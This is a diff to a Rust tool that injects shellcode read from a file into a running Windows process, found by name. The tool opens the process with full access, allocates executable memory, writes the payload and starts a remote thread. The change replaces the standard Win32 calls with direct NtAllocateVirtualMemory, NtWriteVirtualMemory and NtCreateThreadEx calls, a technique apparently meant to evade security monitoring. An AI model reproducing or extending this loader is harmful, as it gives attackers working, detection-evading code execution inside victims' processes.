@@ -1,11 +1,23 @@
-use std::{ptr::null_mut, mem::size_of};
 use clap::Parser;
+
+use ntapi::{
+    ntpsapi::NtCreateThreadEx,
+    ntmmapi::{NtAllocateVirtualMemory, NtWriteVirtualMemory},
+};
+
+use winapi::{
+    shared::ntstatus::STATUS_SUCCESS,
+    um::{
+        processthreadsapi::OpenProcess,
+        winnt::{PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS},
+    },
+};
+
 use windows_sys::Win32::{
     Foundation::{CloseHandle, INVALID_HANDLE_VALUE},
     System::{
-        Diagnostics::{Debug::WriteProcessMemory, ToolHelp::{CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, PROCESSENTRY32, Process32First, Process32Next}},
-        Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
-        Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS},
+        Diagnostics::{ToolHelp::{CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, PROCESSENTRY32, Process32First, Process32Next}},
+        Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
     },
 };
 
@@ -32,6 +44,8 @@ fn main() {
     println!("[+] Process ID: {}", process_id);
 
     let shellcode_bytes = std::fs::read(file_path).expect("Failed to read path to PIC shellcode");
+    let mut shellcode_address = core::ptr::null_mut();
+    let mut size = shellcode_bytes.len();
 
     // Get a handle to the target process with PROCESS_ALL_ACCESS
     let process_handle = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, process_id) };
@@ -43,11 +57,12 @@ fn main() {
     println!("[+] Process handle: {:?}", process_handle);
 
     // Allocate memory in the target process for the shellcode
-    let shellcode_address = unsafe {
-        VirtualAllocEx(
+    let status = unsafe {
+        NtAllocateVirtualMemory(
             process_handle,
-            null_mut(),
-            shellcode_bytes.len(),
+            &mut shellcode_address,
+            0,
+            &mut size,
             MEM_COMMIT | MEM_RESERVE,
             PAGE_EXECUTE_READWRITE,
         )
@@ -58,22 +73,22 @@ fn main() {
         shellcode_address
     );
 
-    if shellcode_address.is_null() {
+    if shellcode_address.is_null() || status != STATUS_SUCCESS {
         panic!("Failed to allocate memory in the target process for the shellcode");
     }
 
     // Write the shellcode to the target process
-    let wpm_result = unsafe {
-        WriteProcessMemory(
+    let status = unsafe {
+        NtWriteVirtualMemory(
             process_handle,
             shellcode_address as _,
             shellcode_bytes.as_ptr() as _,
             shellcode_bytes.len(),
-            null_mut(),
+            core::ptr::null_mut(),
         )
     };
 
-    if wpm_result == 0 {
+    if status != STATUS_SUCCESS {
         panic!("Failed to write the image to the target process");
     }
 
@@ -81,22 +96,31 @@ fn main() {
     //pause();
 
     // Create remote thread and execute our shellcode
-    let thread_handle = unsafe {
-        CreateRemoteThread(
+    let mut thread_handle = core::ptr::null_mut();
+    let status = unsafe {
+        NtCreateThreadEx(
+            &mut thread_handle,
+            THREAD_ALL_ACCESS,
+            core::ptr::null_mut(),
             process_handle,
-            null_mut(),
+            core::mem::transmute(shellcode_address as usize),
+            core::ptr::null_mut(),
             0,
-            Some(std::mem::transmute(shellcode_address as usize)),
-            std::ptr::null_mut(),
             0,
-            null_mut(),
+            0,
+            0,
+            core::ptr::null_mut(),
         )
     };
 
+    if status != STATUS_SUCCESS {
+        panic!("Failed to start a thread in the target process");
+    }
+
     // Close thread and process handle
     unsafe {
-        CloseHandle(thread_handle);
-        CloseHandle(process_handle);
+        CloseHandle(thread_handle as *mut _);
+        CloseHandle(process_handle as *mut _);
     };
 }
 
@@ -108,7 +132,7 @@ fn get_process_id_by_name(process_name: &str) -> Result<u32, String> {
         return Err("Failed to call CreateToolhelp32Snapshot".to_owned());
     }
 
-    let mut process_entry: PROCESSENTRY32 = unsafe { std::mem::zeroed::<PROCESSENTRY32>() };
+    let mut process_entry: PROCESSENTRY32 = unsafe { core::mem::zeroed::<PROCESSENTRY32>() };
     process_entry.dwSize = size_of::<PROCESSENTRY32>() as u32;
 
     if unsafe { Process32First(h_snapshot, &mut process_entry) } == 0 {
